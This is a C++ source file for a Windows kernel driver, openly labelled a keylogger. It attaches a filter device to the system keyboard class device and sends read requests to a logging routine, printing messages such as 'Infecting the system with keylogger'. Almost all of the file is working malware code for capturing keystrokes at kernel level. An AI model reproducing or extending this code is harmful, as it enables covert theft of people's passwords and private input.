
#include "pch.h"
#include "extension.h"
#include "log.h"

auto DrvUnload(_In_ PDRIVER_OBJECT pDrvObj) -> void {
	UNREFERENCED_PARAMETER(pDrvObj);
		
	auto plwDevExt = static_cast<PDEVICE_EXTENSION>(pDevKbd->DeviceExtension);
	
	IoDetachDevice(plwDevExt->pLwkbd);
	IoDeleteDevice(pDevKbd);

	IoDeleteSymbolicLink(&uKeyboardDeviceTarget);
	IoDeleteSymbolicLink(&uDoS);

	DbgPrint("[*] Keylogger unload...\r\n");
}

extern "C" auto DriverEntry(_In_ PDRIVER_OBJECT pDrvObj, _In_ PUNICODE_STRING pRegPath) {
	UNREFERENCED_PARAMETER(pRegPath);

	auto status = STATUS_SUCCESS;
	
	RtlInitUnicodeString(&uKeyboardHhk, L"\\Device\\keylogger");
	RtlInitUnicodeString(&uDoS, L"\\DosDevices\\keylogger");
	
	/* initialize symbolic links */
	status = IoCreateSymbolicLink(&uDoS, &uKeyboardHhk);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[-] IoCreateSymbolicLink failed: 0x%0x\r\n", status);
		return status;
	}
	/* creating a device */
	status = IoCreateDevice(pDrvObj,
		sizeof(DEVICE_EXTENSION),
		&uKeyboardHhk,
		FILE_DEVICE_KEYBOARD,
		NULL,
		false,
		&pDevKbd
	);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[-] Unable to create keyboard device = 0x%0x\r\n", status);
		return status;
	}

	pDevKbd->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pDevKbd->Flags &= ~DO_DEVICE_INITIALIZING;
	pDrvObj->DriverUnload = DrvUnload;


	for (int i = 0; i < ARRAYSIZE(pDrvObj->MajorFunction); ++i)
		pDrvObj->MajorFunction[i] = log::LowKbdDispatchAll;

	pDrvObj->MajorFunction[IRP_MJ_READ] = log::LowKbdReadDispatchRoutine;


	/* attaching device object */
	auto plwDevExt = reinterpret_cast<PDEVICE_EXTENSION>(pDevKbd->DeviceExtension);
	RtlInitUnicodeString(&uKeyboardDeviceTarget, L"\\Device\\KeyboardClass0");
	status = IoAttachDevice(pDevKbd,
		&uKeyboardDeviceTarget,
		&plwDevExt->pLwkbd
		);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[-] IoAttachDevice failed: 0x%0x\r\n", status);

		IoDeleteDevice(pDevKbd);
		IoDeleteSymbolicLink(&uKeyboardDeviceTarget);
		IoDeleteSymbolicLink(&uDoS);
		return status;
	}

	DbgPrint("[*] Keylogger loaded...\r\n");
	DbgPrint("[*] Keyboard device created..\r\n");
	DbgPrint("[*] Infecting the system with keylogger...\r\n");

	return status;
}